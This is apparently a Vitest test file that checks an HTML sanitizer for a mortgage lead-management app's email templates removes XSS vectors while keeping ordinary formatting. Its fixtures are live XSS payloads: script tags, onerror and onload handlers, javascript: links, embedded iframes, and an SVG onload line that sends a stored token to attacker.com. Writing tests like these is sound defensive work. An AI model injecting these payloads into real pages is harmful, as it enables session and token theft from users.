import { describe, it, expect } from 'vitest'
import {
  sanitizeTemplateHtml,
  renderTemplatePreview,
} from '../features/templates/lib/templatePreview'

describe('Security Remediation VULN-01: Template HTML Sanitization & XSS Defense', () => {
  it('strips executable script tags and contents completely', () => {
    const maliciousInput = '<p>Hello</p><script>alert("XSS")</script>'
    const sanitized = sanitizeTemplateHtml(maliciousInput)

    expect(sanitized).not.toContain('<script>')
    expect(sanitized).not.toContain('alert("XSS")')
    expect(sanitized).toContain('<p>Hello</p>')
  })

  it('strips malicious event handlers such as onerror and onload', () => {
    const maliciousImg = '<img src="invalid-image.jpg" onerror="alert(document.cookie)" />'
    const sanitized = sanitizeTemplateHtml(maliciousImg)

    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('alert')
  })

  it('strips malicious SVG onload payloads', () => {
    const maliciousSvg = '<svg onload="window.location=\'https://attacker.com?leak=\'+localStorage.getItem(\'token\')"></svg>'
    const sanitized = sanitizeTemplateHtml(maliciousSvg)

    expect(sanitized).not.toContain('<svg')
    expect(sanitized).not.toContain('onload')
    expect(sanitized).not.toContain('attacker.com')
  })

  it('strips dangerous javascript: protocol from anchor links', () => {
    const maliciousLink = '<a href="javascript:alert(1)">Click here for loan approval</a>'
    const sanitized = sanitizeTemplateHtml(maliciousLink)

    expect(sanitized).not.toContain('javascript:')
    expect(sanitized).toContain('Click here for loan approval')
  })

  it('strips iframe and object embed tags', () => {
    const maliciousEmbed = '<iframe src="https://attacker.com/phishing"></iframe><object data="malicious.swf"></object>'
    const sanitized = sanitizeTemplateHtml(maliciousEmbed)

    expect(sanitized).not.toContain('<iframe')
    expect(sanitized).not.toContain('<object')
  })

  it('preserves legitimate email HTML markup and formatting', () => {
    const legitimateHtml = `
      <p>Dear <strong>Rahul Sharma</strong>,</p>
      <p>Your mortgage application with <em>Apex Home Finance</em> is now in <u>Proposal</u> stage.</p>
      <p>Required items:</p>
      <ul>
        <li>Updated Payslip</li>
        <li>Bank Statement</li>
      </ul>
      <p>Contact your advisor at <a href="mailto:priya@leadflow.in">priya@leadflow.in</a>.</p>
    `.trim()

    const sanitized = sanitizeTemplateHtml(legitimateHtml)

    expect(sanitized).toContain('<strong>Rahul Sharma</strong>')
    expect(sanitized).toContain('<em>Apex Home Finance</em>')
    expect(sanitized).toContain('<ul>')
    expect(sanitized).toContain('<li>Updated Payslip</li>')
    expect(sanitized).toContain('href="mailto:priya@leadflow.in"')
  })

  it('safely handles combined interpolated placeholders and HTML sanitization', () => {
    const rawTemplate = '<p>Hello {{lead.firstName}},</p><img src="x" onerror="alert(1)"><p>Your rate is ready.</p>'
    const rendered = renderTemplatePreview(rawTemplate)
    const sanitized = sanitizeTemplateHtml(rendered)

    expect(sanitized).toContain('Hello Rahul,')
    expect(sanitized).toContain('Your rate is ready.')
    expect(sanitized).not.toContain('onerror')
    expect(sanitized).not.toContain('alert')
  })
})
